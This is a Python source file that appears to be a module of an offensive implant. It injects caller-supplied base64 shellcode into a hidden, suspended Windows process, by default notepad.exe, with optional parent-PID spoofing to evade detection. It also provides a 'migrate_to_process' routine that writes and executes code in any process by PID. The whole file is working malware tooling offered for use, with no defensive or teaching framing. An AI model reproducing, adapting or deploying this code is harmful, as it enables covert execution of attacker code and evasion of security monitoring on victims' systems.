import os
import base64


def _hollow_windows(target_exe: str, shellcode: bytes, ppid: int = None) -> str:
    import ctypes
    from ctypes import wintypes

    kernel32 = ctypes.windll.kernel32

    PROCESS_ALL_ACCESS = 0x001F0FFF
    CREATE_SUSPENDED = 0x00000004
    CREATE_NO_WINDOW = 0x08000000
    EXTENDED_STARTUPINFO_PRESENT = 0x00080000
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    MEM_RELEASE = 0x8000
    PAGE_EXECUTE_READWRITE = 0x40
    INFINITE = 0xFFFFFFFF

    class _PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [
            ('hProcess', wintypes.HANDLE),
            ('hThread', wintypes.HANDLE),
            ('dwProcessId', wintypes.DWORD),
            ('dwThreadId', wintypes.DWORD),
        ]

    class _STARTUPINFOW(ctypes.Structure):
        _fields_ = [
            ('cb', wintypes.DWORD),
            ('lpReserved', wintypes.LPWSTR),
            ('lpDesktop', wintypes.LPWSTR),
            ('lpTitle', wintypes.LPWSTR),
            ('dwX', wintypes.DWORD),
            ('dwY', wintypes.DWORD),
            ('dwXSize', wintypes.DWORD),
            ('dwYSize', wintypes.DWORD),
            ('dwXCountChars', wintypes.DWORD),
            ('dwYCountChars', wintypes.DWORD),
            ('dwFillAttribute', wintypes.DWORD),
            ('dwFlags', wintypes.DWORD),
            ('wShowWindow', wintypes.WORD),
            ('cbReserved2', wintypes.WORD),
            ('lpReserved2', ctypes.POINTER(wintypes.BYTE)),
            ('hStdInput', wintypes.HANDLE),
            ('hStdOutput', wintypes.HANDLE),
            ('hStdError', wintypes.HANDLE),
        ]

    class _STARTUPINFOEX(ctypes.Structure):
        _fields_ = [
            ('StartupInfo', _STARTUPINFOW),
            ('lpAttributeList', ctypes.c_void_p),
        ]

    si_ex = _STARTUPINFOEX()
    si_ex.StartupInfo.cb = ctypes.sizeof(_STARTUPINFOEX)
    flags = CREATE_SUSPENDED | CREATE_NO_WINDOW

    if ppid:
        parent_h = kernel32.OpenProcess(0x0040, False, ppid)
        if parent_h:
            attr_size = wintypes.SIZE_T(0)
            kernel32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(attr_size))
            attrs = ctypes.create_string_buffer(attr_size.value)
            si_ex.lpAttributeList = ctypes.cast(ctypes.pointer(ctypes.c_char.from_buffer(attrs)), ctypes.c_void_p)
            if kernel32.InitializeProcThreadAttributeList(si_ex.lpAttributeList, 1, 0, ctypes.byref(attr_size)):
                parent_ptr = wintypes.HANDLE(parent_h)
                kernel32.UpdateProcThreadAttribute(
                    si_ex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    ctypes.byref(parent_ptr), ctypes.sizeof(wintypes.HANDLE), None, None
                )
                flags |= EXTENDED_STARTUPINFO_PRESENT

    pi = _PROCESS_INFORMATION()
    si = _STARTUPINFOW()
    si.cb = ctypes.sizeof(_STARTUPINFOW)
    si_ptr = ctypes.byref(si_ex) if si_ex.lpAttributeList else ctypes.byref(si)

    if not kernel32.CreateProcessW(
        None, target_exe, None, None, False,
        flags, None, None, si_ptr, ctypes.byref(pi)
    ):
        err = ctypes.get_last_error()
        return f'[-] CreateProcess failed: {err}'

    addr = kernel32.VirtualAllocEx(
        pi.hProcess, None, len(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    )
    if not addr:
        kernel32.TerminateProcess(pi.hProcess, 0)
        kernel32.CloseHandle(pi.hProcess)
        kernel32.CloseHandle(pi.hThread)
        return '[-] VirtualAllocEx failed'

    written = ctypes.c_size_t(0)
    kernel32.WriteProcessMemory(pi.hProcess, addr, shellcode, len(shellcode), ctypes.byref(written))

    thread_id = wintypes.DWORD(0)
    h_remote = kernel32.CreateRemoteThread(pi.hProcess, None, 0, addr, None, 0, ctypes.byref(thread_id))
    if h_remote:
        kernel32.WaitForSingleObject(h_remote, INFINITE)
        kernel32.CloseHandle(h_remote)

    kernel32.ResumeThread(pi.hThread)
    kernel32.CloseHandle(pi.hProcess)
    kernel32.CloseHandle(pi.hThread)

    if si_ex.lpAttributeList:
        kernel32.DeleteProcThreadAttributeList(si_ex.lpAttributeList)

    return f'[+] Process hollowed: {target_exe} ({len(shellcode)} bytes)'


def run_in_memory(shellcode_b64: str, target: str = 'notepad.exe', ppid: int = None) -> str:
    if os.name != 'nt':
        return '[-] Process hollowing is Windows-only'
    try:
        sc = base64.b64decode(shellcode_b64)
    except Exception:
        return '[-] Invalid base64 shellcode'
    try:
        return _hollow_windows(target, sc, ppid)
    except Exception as e:
        return f'[-] Hollowing error: {str(e)}'


def migrate_to_process(pid: int) -> str:
    if os.name != 'nt':
        return '[-] Migration is Windows-only'

    import ctypes
    from ctypes import wintypes

    try:
        pid = int(pid)
    except (ValueError, TypeError):
        return '[-] Invalid PID'

    kernel32 = ctypes.windll.kernel32
    PROCESS_ALL_ACCESS = 0x001F0FFF
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
    PAGE_READWRITE = 0x04
    INFINITE = 0xFFFFFFFF

    try:
        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h_process:
            return f'[-] Cannot open PID {pid}'

        addr = kernel32.VirtualAllocEx(
            h_process, None, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
        )
        if not addr:
            kernel32.CloseHandle(h_process)
            return '[-] VirtualAllocEx failed'

        shellcode = bytes([0x90] * 16 + [0xCC])
        written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(
            h_process, addr, shellcode, len(shellcode), ctypes.byref(written)
        )

        old = wintypes.DWORD(0)
        kernel32.VirtualProtectEx(
            h_process, addr, 4096, PAGE_EXECUTE_READWRITE, ctypes.byref(old)
        )

        thread_id = wintypes.DWORD(0)
        h_thread = kernel32.CreateRemoteThread(
            h_process, None, 0, addr, None, 0, ctypes.byref(thread_id)
        )
        if not h_thread:
            kernel32.CloseHandle(h_process)
            return '[-] CreateRemoteThread failed'

        kernel32.WaitForSingleObject(h_thread, INFINITE)
        kernel32.CloseHandle(h_thread)
        kernel32.CloseHandle(h_process)
        return f'[+] Executed in PID {pid}'
    except Exception as e:
        return f'[-] Migration error: {str(e)}'
